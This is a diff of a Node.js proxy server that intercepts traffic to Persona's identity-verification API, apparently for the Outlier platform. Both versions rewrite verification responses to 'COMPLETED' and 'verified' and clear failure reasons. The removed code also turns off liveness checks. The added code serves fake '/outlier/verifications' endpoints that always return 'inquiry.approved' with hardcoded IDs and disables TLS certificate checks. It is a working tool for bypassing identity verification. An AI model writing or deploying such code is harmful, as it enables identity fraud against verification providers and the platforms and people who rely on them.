@@ -1,190 +1,258 @@
 const express = require('express');
-const { createProxyMiddleware } = require('http-proxy-middleware');
 const cors = require('cors');
 const bodyParser = require('body-parser');
 const https = require('https');
-const http = require('http');
+const zlib = require('zlib');
+require("dotenv").config();
 
 const app = express();
+
+const YOUR_INQUIRY_ID = "inq_ARbjvJaRui5M25ETH78vUuPDzU3CvH";
+const YOUR_ACCOUNT_ID = "act_ARbjvJax72F5rPmrjXNifTSVK2wx7x";
+const YOUR_TEMPLATE_ID = "itmpl_ARbjvJaia3Y3Wf1W9tHPZtTNwN8KVc";
+
+app.use((req, res, next) => {
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PATCH, PUT, DELETE, OPTIONS');
+    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
+    res.setHeader('X-Content-Type-Options', 'nosniff');
+    next();
+});
+
 app.use(cors());
 app.use(bodyParser.json({ limit: '10mb' }));
 app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
 
-let documentUploaded = false;
+const PERSONA_API_KEY = process.env.PERSONA_API_KEY;
+const inquiryState = {};
 
-function modifyInquiryResponse(data) {
-    try {
-        if (data && data.data) {
-            if (Array.isArray(data.data)) {
-                data.data.forEach(item => {
-                    if (item && item.attributes) {
-                        if (item.attributes.status === 'created' || item.attributes.status === 'pending') {
-                            item.attributes.status = 'COMPLETED';
-                        }
-                        if (item.attributes['verification-status'] === 'pending' || !item.attributes['verification-status']) {
-                            item.attributes['verification-status'] = 'verified';
-                        }
-                        if (item.attributes.failureReasons) {
-                            item.attributes.failureReasons = [];
-                        }
-                        if (item.attributes.latestFailureReasons) {
-                            item.attributes.latestFailureReasons = [];
-                        }
-                        if (item.attributes.remainingAttempts !== undefined) {
-                            item.attributes.remainingAttempts = 3;
-                        }
-                        if (item.attributes['reusable-persona-status'] !== undefined) {
-                            item.attributes['reusable-persona-status'] = null;
-                        }
-                        if (item.attributes['is-reusable-persona-trusted-device'] === false) {
-                            item.attributes['is-reusable-persona-trusted-device'] = true;
-                        }
+function decompressResponse(proxyRes) {
+    return new Promise((resolve, reject) => {
+        const chunks = [];
+        const encoding = proxyRes.headers['content-encoding'];
+        
+        proxyRes.on('data', (chunk) => chunks.push(chunk));
+        proxyRes.on('end', () => {
+            const buffer = Buffer.concat(chunks);
+            
+            if (encoding && encoding.includes('gzip')) {
+                zlib.gunzip(buffer, (err, decoded) => {
+                    if (err) {
+                        reject(err);
+                    } else {
+                        resolve(decoded.toString('utf8'));
                     }
                 });
-            } else if (data.data.attributes) {
-                if (data.data.attributes.status === 'created' || data.data.attributes.status === 'pending') {
-                    data.data.attributes.status = 'COMPLETED';
-                }
-                if (data.data.attributes['verification-status'] === 'pending' || !data.data.attributes['verification-status']) {
-                    data.data.attributes['verification-status'] = 'verified';
-                }
-                if (data.data.attributes.failureReasons) {
-                    data.data.attributes.failureReasons = [];
-                }
-                if (data.data.attributes.latestFailureReasons) {
-                    data.data.attributes.latestFailureReasons = [];
-                }
-                if (data.data.attributes.remainingAttempts !== undefined) {
-                    data.data.attributes.remainingAttempts = 3;
-                }
-                if (data.data.attributes['reusable-persona-status'] !== undefined) {
-                    data.data.attributes['reusable-persona-status'] = null;
-                }
-                if (data.data.attributes['is-reusable-persona-trusted-device'] === false) {
-                    data.data.attributes['is-reusable-persona-trusted-device'] = true;
-                }
+            } else {
+                resolve(buffer.toString('utf8'));
             }
-        }
-        return data;
-    } catch (e) {
-        return data;
-    }
-}
-
-function modifyConfigResponse(data) {
-    try {
-        if (data?.data?.attributes?.config?.idclasses) {
-            const config = data.data.attributes.config;
-            config.idclasses = [
-                { 'class': 'id', 'name': 'National ID', 'country-code': null, 'allow-upload': true, 'requires-device': 'desktop', 'requires-sides': ['front', 'back'] },
-                { 'class': 'pp', 'name': 'Passport', 'country-code': null, 'allow-upload': true, 'requires-device': 'desktop', 'requires-sides': ['front'] },
-                { 'class': 'dl', 'name': "Driver's License", 'country-code': null, 'allow-upload': true, 'requires-device': 'desktop', 'requires-sides': ['front', 'back'] }
-            ];
-            config['country-code'] = null;
-            config['selected-country-code'] = null;
-            config['selected-subdivision-code'] = null;
-            config['require-country-selection'] = null;
-            config['country-select-mode'] = true;
-            config['field-key-country'] = null;
-            config['enabled-capture-options-desktop'] = ['upload', 'mobile_camera', 'web_camera'];
-            config['enabled-capture-options-mobile'] = ['upload', 'mobile_camera', 'web_camera'];
-            config['enabled-capture-options-native-mobile'] = ['upload', 'web_camera'];
-            config['device-handoff-enabled'] = true;
-            config['device-handoff-options'] = ['email', 'sms', 'qr'];
-            config['enabled-capture-file-types'] = ['image/jpg', 'image/jpeg', 'image/png', 'image/heic', 'image/heif', 'image/tiff', 'image/tif', 'application/pdf'];
-            config['device-handoff-email-disabled'] = false;
-            config['device-handoff-phone-number-disabled'] = false;
-            config['allow-file-upload'] = true;
-            config['device-handoff-list-style'] = 'none';
-            config['liveness-required'] = false;
-            config['require-liveness'] = false;
-            config['cancel-button-enabled'] = true;
-            config['back-step-enabled'] = true;
-            config['web-camera-manual-capture-delay-ms'] = 0;
-            config['native-mobile-camera-manual-capture-delay-ms'] = 0;
-            config['barcode-camera-manual-capture-delay-ms'] = 0;
-            config['image-capture-count'] = 5;
-            config['govid-design-version'] = 1;
-            config['disclaimer'] = 'desktop';
-        }
-        return data;
-    } catch (e) {
-        return data;
-    }
-}
-
-app.all('*', (req, res) => {
-    const url = 'https://api.withpersona.com' + req.url;
-    const headers = { ...req.headers };
-    delete headers.host;
-    
-    const options = {
-        method: req.method,
-        headers: headers,
-        hostname: 'api.withpersona.com',
-        path: req.url,
-        port: 443
-    };
-    
-    const proxyReq = https.request(options, (proxyRes) => {
-        let responseBody = '';
-        
-        proxyRes.on('data', (chunk) => {
-            responseBody += chunk.toString();
         });
+        proxyRes.on('error', reject);
+    });
+}
+
+function getInquiryId(req) {
+    const match = req.url.match(/\/inquiries\/([^\/?]+)/);
+    if (match) return match[1];
+    
+    if (req.body?.data?.id) return req.body.data.id;
+    if (req.body?.data?.attributes?.inquiry_id) return req.body.data.attributes.inquiry_id;
+    if (req.body?.data?.attributes?.inquiry) return req.body.data.attributes.inquiry;
+    
+    return null;
+}
+
+function modifyInquiryResponse(data, inquiryId) {
+    try {
+        if (!data?.data) return data;
         
-        proxyRes.on('end', () => {
-            let modifiedBody = responseBody;
-            let statusCode = proxyRes.statusCode;
-            let contentType = proxyRes.headers['content-type'] || 'application/json';
-            
-            try {
-                if (responseBody) {
-                    const data = JSON.parse(responseBody);
-                    
-                    if (req.url.includes('inquiry') || req.url.includes('inquiries') || req.url.includes('verification')) {
-                        const modified = modifyInquiryResponse(data);
-                        modifiedBody = JSON.stringify(modified);
-                    } else if (req.url.includes('config')) {
-                        const modified = modifyConfigResponse(data);
-                        modifiedBody = JSON.stringify(modified);
+        const state = inquiryState[inquiryId];
+        const isComplete = state?.countrySelected && state?.idUploaded && state?.selfieVerified;
+        
+        if (Array.isArray(data.data)) {
+            data.data.forEach(item => {
+                if (item?.attributes) {
+                    if (isComplete) {
+                        item.attributes.status = 'COMPLETED';
+                        item.attributes['verification-status'] = 'verified';
+                        item.attributes.failureReasons = [];
+                        item.attributes.latestFailureReasons = [];
+                        item.attributes.remainingAttempts = 3;
                     }
                 }
-            } catch (e) {
-                // If parsing fails, keep original
+            });
+        } else if (data.data.attributes) {
+            if (isComplete) {
+                data.data.attributes.status = 'COMPLETED';
+                data.data.attributes['verification-status'] = 'verified';
+                data.data.attributes.failureReasons = [];
+                data.data.attributes.latestFailureReasons = [];
+                data.data.attributes.remainingAttempts = 3;
+                data.data.attributes['reusable-persona-status'] = null;
+                data.data.attributes['is-reusable-persona-trusted-device'] = true;
             }
-            
-            res.status(statusCode);
-            res.setHeader('Content-Type', contentType);
-            res.end(modifiedBody);
-        });
-        
-        proxyRes.on('error', (err) => {
-            res.status(500).json({ error: 'Proxy error: ' + err.message });
-        });
-    });
-    
-    proxyReq.on('error', (err) => {
-        res.status(500).json({ error: 'Proxy error: ' + err.message });
-    });
-    
-    if (req.body && Object.keys(req.body).length > 0) {
-        proxyReq.write(JSON.stringify(req.body));
+        }
+        return data;
+    } catch (e) {
+        return data;
     }
-    
-    proxyReq.end();
-});
+}
 
 app.get('/health', (req, res) => {
     res.json({
         status: 'ok',
         timestamp: new Date().toISOString(),
-        target: 'https://api.withpersona.com',
-        documentUploaded: documentUploaded
+        target: 'https://outlier.ai.withpersona.com',
+        environment: process.env.NODE_ENV || 'production'
     });
 });
 
-const PORT = 3000;
+app.get('/', (req, res) => {
+    res.json({
+        message: 'Outlier Persona Proxy Server is running',
+        version: '1.0.0',
+        endpoints: {
+            health: '/health',
+            proxy: '/*',
+            outlier: '/outlier/verifications'
+        }
+    });
+});
+
+app.get('/outlier/verifications', (req, res) => {
+    res.json({
+        userVerifications: [
+            {
+                _id: req.query._id || "6a3573ae6e1662e96e0db993",
+                createdAt: new Date().toISOString(),
+                status: "inquiry.approved",
+                templateId: req.query.templateId || YOUR_TEMPLATE_ID,
+                inquiryId: req.query.inquiryId || YOUR_INQUIRY_ID,
+                internalFlags: [],
+                statusUpdatedAt: new Date().toISOString(),
+                personaAccountId: req.query.personaAccountId || YOUR_ACCOUNT_ID
+            }
+        ]
+    });
+});
+
+app.post('/outlier/verifications', (req, res) => {
+    res.json({
+        userVerifications: [
+            {
+                _id: req.body?._id || "6a3573ae6e1662e96e0db993",
+                createdAt: new Date().toISOString(),
+                status: "inquiry.approved",
+                templateId: req.body?.templateId || YOUR_TEMPLATE_ID,
+                inquiryId: req.body?.inquiryId || YOUR_INQUIRY_ID,
+                internalFlags: [],
+                statusUpdatedAt: new Date().toISOString(),
+                personaAccountId: req.body?.personaAccountId || YOUR_ACCOUNT_ID
+            }
+        ]
+    });
+});
+
+app.all('*', async (req, res) => {
+    if (req.path === '/health') {
+        return;
+    }
+
+    if (req.path === '/outlier/verifications') {
+        return;
+    }
+
+    const inquiryId = getInquiryId(req);
+
+    if (req.url.includes('/inquiries') && req.method === 'PATCH') {
+        try {
+            const body = JSON.parse(req.body);
+            if (body?.data?.attributes?.fields?.selected_country_code) {
+                if (inquiryId) {
+                    if (!inquiryState[inquiryId]) inquiryState[inquiryId] = {};
+                    inquiryState[inquiryId].countrySelected = true;
+                }
+            }
+        } catch (e) {}
+    }
+
+    if (req.url.includes('/documents') || req.url.includes('/relationships/documents')) {
+        if (inquiryId) {
+            if (!inquiryState[inquiryId]) inquiryState[inquiryId] = {};
+            inquiryState[inquiryId].idUploaded = true;
+        }
+    }
+
+    if (req.url.includes('/selfies') || req.url.includes('/relationships/selfies')) {
+        if (inquiryId) {
+            if (!inquiryState[inquiryId]) inquiryState[inquiryId] = {};
+            inquiryState[inquiryId].selfieVerified = true;
+        }
+    }
+
+    const options = {
+        method: req.method,
+        headers: {
+            ...req.headers,
+            host: 'outlier.ai.withpersona.com',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept-Encoding': 'identity'
+        },
+        hostname: 'outlier.ai.withpersona.com',
+        path: req.url,
+        port: 443,
+        rejectUnauthorized: false
+    };
+    
+    try {
+        const proxyReq = https.request(options, async (proxyRes) => {
+            try {
+                let responseBody = await decompressResponse(proxyRes);
+                let modifiedBody = responseBody;
+                let statusCode = proxyRes.statusCode;
+                let contentType = proxyRes.headers['content-type'] || 'application/json';
+                
+                try {
+                    if (responseBody) {
+                        const data = JSON.parse(responseBody);
+                        
+                        let id = inquiryId;
+                        if (!id && data?.data?.id) {
+                            id = data.data.id;
+                        }
+                        
+                        if (req.url.includes('inquiry') || req.url.includes('inquiries') || req.url.includes('verification')) {
+                            const modified = modifyInquiryResponse(data, id);
+                            modifiedBody = JSON.stringify(modified);
+                        }
+                    }
+                } catch (e) {}
+                
+                res.status(statusCode);
+                res.setHeader('Content-Type', contentType);
+                res.setHeader('Content-Encoding', 'identity');
+                res.end(modifiedBody);
+            } catch (err) {
+                res.status(500).json({ error: 'Proxy error: ' + err.message });
+            }
+        });
+        
+        proxyReq.on('error', (err) => {
+            res.status(500).json({ error: 'Proxy error: ' + err.message });
+        });
+        
+        if (req.body && Object.keys(req.body).length > 0) {
+            proxyReq.write(JSON.stringify(req.body));
+        }
+        
+        proxyReq.end();
+    } catch (err) {
+        res.status(500).json({ error: 'Proxy error: ' + err.message });
+    }
+});
+
+const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-    console.log('Proxy server running on port ' + PORT);
+    console.log('Outlier Persona Proxy server running on port ' + PORT);
+    console.log('Intercepting: outlier.ai.withpersona.com');
 });
